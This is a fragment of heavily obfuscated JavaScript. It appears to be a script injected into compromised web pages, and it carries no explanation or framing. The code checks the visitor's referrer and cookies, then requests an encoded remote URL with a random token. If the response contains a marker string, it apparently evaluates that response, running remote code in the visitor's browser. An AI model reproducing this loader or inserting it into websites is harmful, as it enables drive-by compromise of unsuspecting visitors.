XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};